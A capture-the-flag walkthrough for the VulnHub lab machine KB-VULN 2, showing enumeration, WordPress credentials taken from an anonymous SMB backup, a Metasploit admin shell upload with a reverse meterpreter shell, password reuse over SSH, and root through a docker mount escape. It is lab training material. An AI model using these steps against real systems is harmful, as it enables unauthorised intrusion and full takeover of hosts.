
# KB-VULN 2 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/kb-vuln-2,562/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.183   08:00:27:2c:e4:d3      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.183
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 16:45 -03
Nmap scan report for 192.168.1.183
Host is up (0.00074s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:99:01:23:fe:c4:84:ef:14:55:87:da:a3:30:6f:50 (RSA)
|   256 cb:8e:e1:b3:3a:6e:64:9e:0f:53:39:7e:18:9d:8b:3f (ECDSA)
|_  256 ec:3b:d9:53:4a:5a:f7:32:f2:3a:f7:a7:6f:31:87:52 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: kb-server
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: kb-server
|_  System time: 2021-04-01T19:45:32+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-01T19:45:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
```

## Web Analysis

Update `/etc/hosts` with **kb.vuln** DNS
```
192.168.1.183 kb.vuln
```

```
$ dirb http://192.168.1.183

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  1 16:47:47 2021
URL_BASE: http://192.168.1.183/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.183/ ----
+ http://192.168.1.183/index.html (CODE:200|SIZE:10918)                                                              
+ http://192.168.1.183/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.183/wordpress/                                                                       
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/ ----
+ http://192.168.1.183/wordpress/index.php (CODE:301|SIZE:0)                                                         
==> DIRECTORY: http://192.168.1.183/wordpress/uploads/                                                               
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/                                                              
==> DIRECTORY: http://192.168.1.183/wordpress/wp-content/                                                            
==> DIRECTORY: http://192.168.1.183/wordpress/wp-includes/                                                           
+ http://192.168.1.183/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                       
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/ ----
+ http://192.168.1.183/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/css/                                                          
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/images/                                                       
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/includes/                                                     
+ http://192.168.1.183/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/js/                                                           
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/maint/                                                        
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/network/                                                      
==> DIRECTORY: http://192.168.1.183/wordpress/wp-admin/user/                                                         
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-content/ ----
+ http://192.168.1.183/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                              
==> DIRECTORY: http://192.168.1.183/wordpress/wp-content/plugins/                                                    
==> DIRECTORY: http://192.168.1.183/wordpress/wp-content/themes/                                                     
==> DIRECTORY: http://192.168.1.183/wordpress/wp-content/upgrade/                                                    
==> DIRECTORY: http://192.168.1.183/wordpress/wp-content/uploads/                                                    
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/network/ ----
+ http://192.168.1.183/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                        
+ http://192.168.1.183/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                        
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-admin/user/ ----
+ http://192.168.1.183/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                           
+ http://192.168.1.183/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                           
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-content/plugins/ ----
+ http://192.168.1.183/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                      
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-content/themes/ ----
+ http://192.168.1.183/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                       
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.183/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Apr  1 16:48:01 2021
DOWNLOADED: 36896 - FOUND: 13
```

```
$ nikto -h http://192.168.1.183

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.183
+ Target Hostname:    192.168.1.183
+ Target Port:        80
+ Start Time:         2021-04-01 16:47:59 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5af6a75f71df8, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-04-01 16:49:05 (GMT-3) (66 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.183
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,js,/,html,php
[+] Timeout:                 10s
===============================================================
2021/04/01 16:49:01 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.183/wordpress/]
/server-status        (Status: 403) [Size: 278]                                      
                                                                                     
===============================================================
2021/04/01 16:54:45 Finished
===============================================================
```

## WordPress Analysis

```
$ wpscan -e ap,at,u --url http://kb.vuln/wordpress

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://kb.vuln/wordpress/ [192.168.1.183]
[+] Started: Thu Apr  1 16:57:38 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://kb.vuln/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://kb.vuln/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://kb.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://kb.vuln/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://kb.vuln/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://kb.vuln/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: best-education
 | Location: http://kb.vuln/wordpress/wp-content/themes/best-education/
 | Last Updated: 2020-12-21T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/best-education/readme.txt
 | [!] The version is out of date, the latest version is 1.1.2
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/best-education/style.css?ver=5.5.1
 | Style Name: Best Education
 | Style URI: https://thememattic.com/theme/best-education
 | Description: Best Education is the flexible and highly responsive wordpress theme that helps in creating the best...
 | Author: Thememattic
 | Author URI: https://thememattic.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/best-education/style.css?ver=5.5.1, Match: 'Version: 1.1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:24 <=================================> (22292 / 22292) 100.00% Time: 00:00:24
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] best-education
 | Location: http://kb.vuln/wordpress/wp-content/themes/best-education/
 | Last Updated: 2020-12-21T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/best-education/readme.txt
 | [!] The version is out of date, the latest version is 1.1.2
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/best-education/style.css
 | Style Name: Best Education
 | Style URI: https://thememattic.com/theme/best-education
 | Description: Best Education is the flexible and highly responsive wordpress theme that helps in creating the best...
 | Author: Thememattic
 | Author URI: https://thememattic.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/best-education/, status: 500
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/best-education/style.css, Match: 'Version: 1.1.0'

[+] twentynineteen
 | Location: http://kb.vuln/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.7'

[+] twentyseventeen
 | Location: http://kb.vuln/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.4'

[+] twentytwenty
 | Location: http://kb.vuln/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://kb.vuln/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://kb.vuln/wordpress/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://kb.vuln/wordpress/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://kb.vuln/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Apr  1 16:58:14 2021
[+] Requests Done: 22368
[+] Cached Requests: 19
[+] Data Sent: 5.925 MB
[+] Data Received: 19.714 MB
[+] Memory used: 280.078 MB
[+] Elapsed time: 00:00:35
```

Wordpress User: **admin**

## SMB Analysis

```
$ smbmap -H 192.168.1.183

[+] Guest session   	IP: 192.168.1.183:445	Name: kb.vuln
    Disk                Permissions Comment
	----                ----------- -------
	Anonymous           READ ONLY   OPEN YOUR EYES!
	IPC$                NO ACCESS   IPC Service (Samba Server 4.7.6-Ubuntu)
```

```
$ smbclient //192.168.1.183/Anonymous
Enter WORKGROUP\burton's password: anonymous

smb: \> dir
  .                                   D        0  Thu Sep 17 07:58:56 2020
  ..                                  D        0  Wed Sep 16 07:36:09 2020
  backup.zip                          N 16735117  Thu Sep 17 07:58:56 2020

		14380040 blocks of size 1024. 8631056 blocks available

smb: \> get backup.zip
getting file \backup.zip of size 16735117 as backup.zip (144627.2 KiloBytes/sec) (average 144627.3 KiloBytes/sec)

smb: \> exit
$
```

Analysing `backup.zip` file.
```
$ unzip backup.zip

$ cat remember_me.txt 
Username:admin
Password:MachineBoy141
```

Credentials:
* User: **admin**
* Pass: **MachineBoy141**

## Exploitation

```
$ msfconsole

msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.183
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD MachineBoy141
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false

msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   MachineBoy141    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.183    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress       yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Authenticating with WordPress using admin:MachineBoy141...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/rvIUmoEttm/bAaiqEYCzH.php...
[*] Sending stage (39282 bytes) to 192.168.1.183
[+] Deleted bAaiqEYCzH.php
[+] Deleted rvIUmoEttm.php
[+] Deleted ../rvIUmoEttm
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.183:53650) at 2021-04-01 17:28:03 -0300

meterpreter > sysinfo
Computer    : kb-server
OS          : Linux kb-server 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64
Meterpreter : php/linux
```

```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@kb-server:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@kb-server:/home/kbadmin$ cat user.txt
03bf4d20dac5644c75e69e40bad48db0
```

## Privilege Escalation - kbadmin

```
$ ssh kbadmin@192.168.1.183
kbadmin@192.168.1.183's password: MachineBoy141

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr  1 20:33:28 UTC 2021

  System load:  0.0                Processes:              117
  Usage of /:   34.9% of 13.71GB   Users logged in:        0
  Memory usage: 44%                IP address for enp0s3:  192.168.1.183
  Swap usage:   0%                 IP address for docker0: 172.17.0.1

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

7 packages can be updated.
0 updates are security updates.

New release '20.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

*** System restart required ***
Last login: Thu Apr  1 20:33:03 2021 from 192.168.1.189
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kbadmin@kb-server:~$ id
uid=1000(kbadmin) gid=1000(kbadmin) groups=1000(kbadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)
```

## Privilege Escalation - Root

```
kbadmin@kb-server:~$ cat note.txt 
use DOCKER!
```

Using GTFOBins: https://gtfobins.github.io/gtfobins/docker/
```
kbadmin@kb-server:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
ca3cd42a7c95: Pull complete 
Digest: sha256:ec14c7992a97fc11425907e908340c6c3d6ff602f5f13d899e6b7027c9b4133a
Status: Downloaded newer image for alpine:latest

# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

## Flag #2 - Root

```
# cat flag.txt
dc387b4cf1a4143f562dd1bdb3790ff1
```
